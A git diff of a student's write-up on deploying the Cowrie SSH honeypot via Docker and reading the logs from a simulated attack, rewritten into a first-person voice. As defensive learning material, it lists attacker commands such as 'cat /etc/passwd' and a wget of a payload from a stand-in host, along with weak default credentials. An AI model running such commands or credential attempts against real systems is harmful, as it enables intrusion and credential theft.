@@ -7,40 +7,38 @@
 
 ## Summary
 
-Deployed [Cowrie](https://github.com/cowrie/cowrie), a medium-interaction SSH/Telnet honeypot, locally via Docker. Cowrie doesn't just refuse or accept connections — it emulates a full fake Linux shell, so anything an attacker does after logging in (commands run, files read, files downloaded) gets logged in detail instead of the connection just dying. Generated a realistic test session against it to understand exactly what data a honeypot like this captures and why each piece matters for detection work.
-
-This is the first step of a larger plan: a local proof-of-concept now, a cloud-hosted version exposed to real internet attackers later, feeding into a home Wazuh SIEM lab for full detection/triage practice.
+I'm working toward a SOC analyst role, and this was the first hands-on project on that path — deliberately timed to when I'd actually covered the underlying concept, honeypots, in my CompTIA Security+ study, rather than jumping ahead of what I understood. I deployed [Cowrie](https://github.com/cowrie/cowrie), a fake SSH server that logs everything an attacker does against it, locally via Docker, then simulated a realistic attack against my own honeypot to see exactly what data it captures and why it matters. This is phase one of a bigger plan — eventually I'll expose a version of this to real internet traffic from a cloud server and feed it into a home SIEM lab I'm building, but for now this was about understanding the tool and its data before scaling it up.
 
 ## What a Honeypot Actually Is
 
-A honeypot is a fake system with no legitimate reason for anyone to touch it — so any interaction with it is essentially guaranteed to be malicious. Unlike a real server, there's no "false positive" problem: nobody accidentally SSHes into a honeypot. Cowrie specifically fakes an SSH/Telnet server; once someone "logs in" (Cowrie deliberately accepts a range of weak credentials, same as many misconfigured real servers do), they land in a convincing fake Debian filesystem and every single thing they type gets recorded.
+A honeypot is a fake system with no legitimate reason for anyone to touch it — so if something interacts with it, it's safe to assume that's an attacker, no guessing required. I first ran into this idea studying deception technology for Security+, where honeypots, honeynets, and honeytokens are all the same core concept: bait that only a bad actor would ever take. Cowrie goes further than a bare trip-wire honeypot, though — it doesn't just detect a connection, it fakes an entire convincing Linux shell, so once someone thinks they're in, they keep going and give up a lot more about how they actually operate than a simple detection would.
 
 ## Deployment
 
-Installed Docker (`docker.io` from Kali's repos) and ran the official image with one command:
+Docker wasn't already installed on my Kali box, so that was step one — one line from Kali's own repos, `sudo apt install docker.io`. Once that was running, standing up Cowrie itself took a single command:
 
 ```
 docker run -d -p 2222:2222 --name cowrie-honeypot --restart unless-stopped cowrie/cowrie:latest
 ```
 
-That's it — Cowrie is now listening on port 2222, pretending to be an SSH server.
+That pulled the official image and had it listening on port 2222, pretending to be a real SSH server, in under a minute.
 
 ## Test Methodology
 
-Since this is running locally with no internet exposure yet, there's no real attacker traffic to observe. To understand what the tool actually captures, I simulated attacker behavior against my own honeypot using a small Python script (`paramiko`, an SSH library):
+Since this is running locally with nothing exposed to the internet yet, there's no real attacker traffic hitting it — so to actually see what the tool captures, I had to generate that traffic myself. I wrote a small Python script using `paramiko`, an SSH library, to:
 
-1. Tried five common weak username/password pairs to see which ones Cowrie's fake auth accepts (it doesn't accept everything — that's deliberate, it mimics a real brute-force success rate).
-2. Once "in," ran a realistic recon-and-exfiltration sequence: `whoami`, `uname -a`, `ls -la /`, `cat /etc/passwd`, `wget` a fake payload URL, `ps aux`, `exit`.
+1. Try five common weak username/password combinations against it, to see which ones it lets through. Cowrie isn't supposed to accept everything — it's built to mimic a realistic brute-force success rate — and sure enough, only some of them worked.
+2. Once I was "in," I ran through a realistic recon-and-exfiltration sequence an actual attacker might run: `whoami`, `uname -a`, `ls -la /`, `cat /etc/passwd`, a `wget` of a fake payload, `ps aux`, then `exit`.
 
-Full raw captured log: [`evidence/cowrie-session-log-2026-09-02.json`](../evidence/cowrie-session-log-2026-09-02.json)
+Full raw captured log is here: [`evidence/cowrie-session-log-2026-09-02.json`](../evidence/cowrie-session-log-2026-09-02.json)
 
-## Log Analysis — What Got Captured and Why It Matters
+## Log Analysis — What I Found and Why It Matters
 
-Cowrie logs everything as structured JSON (`cowrie.json`), one event per line — this is exactly the format a SIEM like Wazuh ingests, which is why this project is designed to plug into the home lab later.
+Cowrie logs everything as structured JSON, one event per line — this is exactly the format a SIEM like Wazuh ingests, which is part of why I picked this as the entry point into the bigger lab I'm planning.
 
-**1. Connection + client fingerprinting** — every connection logs source IP/port, and a `hassh` fingerprint (a hash of the client's SSH algorithm preferences). Two different attackers using two different SSH clients (or the same tool, different versions) often produce different hassh values — useful for clustering/attributing activity even before looking at behavior.
+**1. Connection and client fingerprinting** — Every connection logs the source IP and port, plus something called a hassh fingerprint, a hash of the client's SSH settings. Two different attack tools, or even two versions of the same tool, tend to produce different hassh values — meaning I could start grouping activity by who's actually behind it before even looking at what they typed.
 
-**2. Credential attempts, failed and successful:**
+**2. Credential attempts:**
 ```
 login attempt [root/123456] failed
 login attempt [root/root] failed
@@ -49,9 +47,9 @@ login attempt [admin/admin] succeeded
 login attempt [root/password] succeeded
 login attempt [test/test] succeeded
 ```
-This is a textbook credential-stuffing pattern — a handful of the most common weak default credentials, tried in rapid succession, several landing. In a real SOC context, several successful "logins" against the same host in seconds is itself a massive red flag regardless of what happens next — the volume and speed is the signal, not just the individual attempt.
+Watching this happen, it's a textbook credential-stuffing pattern: a handful of the most common weak passwords, fired off back to back, several landing. What stood out to me is that in a real SOC seat, you wouldn't even need to know what happened after the login to flag this — several successful logins against the same box in under a second is the alarm bell by itself.
 
-**3. Full command session, logged one command at a time:**
+**3. Full command session:**
 ```
 CMD: whoami
 CMD: uname -a
@@ -61,24 +59,24 @@ CMD: wget http://example.com/malware.sh
 CMD: ps aux
 CMD: exit
 ```
-This is the recon phase of a real intrusion, captured exactly as it happened: identify yourself, fingerprint the OS, look around, grab the password file, pull down a second-stage payload, check what's running. An analyst reading this log doesn't need to guess intent — it's a readable narrative of an attack in progress.
+Reading this back was honestly the coolest part. It's not abstract, it's a straight narrative: figure out who you are, fingerprint the box, look around, grab the password file, pull down a second payload, check what's running. I didn't have to interpret intent — the log just tells the story.
 
-**4. File download capture** — the `wget` command didn't just get logged as text. Cowrie actually intercepted it, saved the "downloaded" content, and recorded its SHA-256 hash:
+**4. File download capture:**
 ```
 Downloaded URL (http://example.com/malware.sh) with SHA-256 ff67a9d7...
 ```
-In a real incident, that hash is what you'd check against VirusTotal or a threat intel feed to identify the malware family — this is the exact mechanic the Wazuh+VirusTotal integration in the planned SIEM lab automates.
+This one actually surprised me. I expected the `wget` command to just show up as a line of text, but Cowrie caught the file itself and hashed it. That's the exact hook a SIEM would use to check a file against VirusTotal automatically — seeing it happen live made the whole "why hashes matter" idea click in a way just reading about it hadn't.
 
-**5. TTY session recording** — the entire terminal session was also saved as a replayable recording (`cowrie.log.closed`, `ttylog` field), meaning the full session can be played back later exactly as it happened, not just reconstructed from log lines.
+**5. TTY session recording** — On top of the JSON log, the whole terminal session got saved as a replayable recording too. So beyond just reading log lines, I could actually play the session back and watch it happen exactly as it did.
 
 ## What This Demonstrates
 
-- Understanding of deception technology as a detection mechanism (ties to Security+ Domain 1.2).
-- Ability to deploy and configure a real security tool from scratch, not just read about it.
-- Comfort reading and interpreting structured security logs — connection metadata, auth events, command telemetry, file capture — which is the core daily task of a SOC analyst.
-- A concrete artifact (real captured JSON logs) instead of just a description of what the tool "should" do.
+- I understand deception technology as a real detection mechanism, not just a Security+ exam term (Domain 1.2).
+- I can deploy and configure a real security tool from scratch, not just read about how it works.
+- I'm comfortable reading and interpreting structured security logs — connection metadata, auth events, command telemetry, file capture — which is the core daily task of a SOC analyst.
+- This is a real artifact: my own captured JSON logs, not a screenshot from someone else's tutorial.
 
 ## Next Steps
 
-- Deploy this same honeypot on a cloud VPS to capture genuine internet attacker traffic instead of simulated sessions.
-- Forward its logs into a home Wazuh SIEM instance (planned — see the home SIEM lab project) for real-time alerting and dashboarding instead of manually reading the JSON file.
+- Deploy this same honeypot on a cloud VPS so it's catching genuine internet attackers instead of my own simulated sessions.
+- Forward its logs into the home Wazuh SIEM I'm building next, so I can practice real-time alerting and triage instead of manually reading a JSON file.
